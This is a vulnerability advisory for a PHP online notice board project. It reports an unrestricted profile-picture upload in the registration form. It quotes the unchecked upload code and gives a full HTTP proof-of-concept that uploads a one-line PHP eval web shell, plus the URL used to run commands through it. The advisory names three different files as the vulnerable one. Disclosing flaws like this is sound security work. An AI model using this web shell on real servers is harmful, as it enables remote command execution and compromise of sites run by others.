# online-notice-board-using-php has unrestricted upload that can cause remote code execution vulnerability in index.php

## supplier 
https://code-projects.org/online-notice-board-using-php-source-code/  
## Vulnerability file
registration.php  

## describe
Attacker can upload malicious file when registering through the profile picture upload.  
The uploaded profile picture is in no restrictions and will be stored in /images/{USER-EMAIL}/{UPLOAD_FILENAME}  
Hackers can upload .php file such as <? eval($_GET[1])?> and visit /images/{USER-EMAIL}/malicious_php_file.php?1={ANY COMMAND HERE} to execute any command.  

**Code analysis**    

Line 36-37 in edit.php
```
mkdir("images/$e");
move_uploaded_file($_FILES['img']['tmp_name'],"images/$e/".$_FILES['img']['name']);
```
parameter $e is user's email when registering.  
no retrictions to the image uploaded.  

## POC

```
POST /registration.php HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 1172
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://127.0.0.1:8081
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrHSdH2MF1kcJ6HUB
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8081/registration.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryrHSdH2MF1kcJ6HUB
Content-Disposition: form-data; name="n"

test
------WebKitFormBoundaryrHSdH2MF1kcJ6HUB
Content-Disposition: form-data; name="e"

test
------WebKitFormBoundaryrHSdH2MF1kcJ6HUB
Content-Disposition: form-data; name="p"

test
------WebKitFormBoundaryrHSdH2MF1kcJ6HUB
Content-Disposition: form-data; name="mob"

test
------WebKitFormBoundaryrHSdH2MF1kcJ6HUB
Content-Disposition: form-data; name="gen"

test
------WebKitFormBoundaryrHSdH2MF1kcJ6HUB
Content-Disposition: form-data; name="hob[]"

reading
------WebKitFormBoundaryrHSdH2MF1kcJ6HUB
Content-Disposition: form-data; name="img"; filename="basic_webshell.php"
Content-Type: application/octet-stream

<?php @eval($_GET['attack']);?>

------WebKitFormBoundaryrHSdH2MF1kcJ6HUB
Content-Disposition: form-data; name="yy"

1950
------WebKitFormBoundaryrHSdH2MF1kcJ6HUB
Content-Disposition: form-data; name="mm"

2
------WebKitFormBoundaryrHSdH2MF1kcJ6HUB
Content-Disposition: form-data; name="dd"

3
------WebKitFormBoundaryrHSdH2MF1kcJ6HUB
Content-Disposition: form-data; name="save"

Save
------WebKitFormBoundaryrHSdH2MF1kcJ6HUB--


```
Visit this URL to execute any command 
```
/images/test/basic_webshell.php?attack={YOUR COMMAND}
```

**Result**

![image](https://github.com/user-attachments/assets/68dbbe94-0b0f-48ed-ad62-7751d32e0f3d)

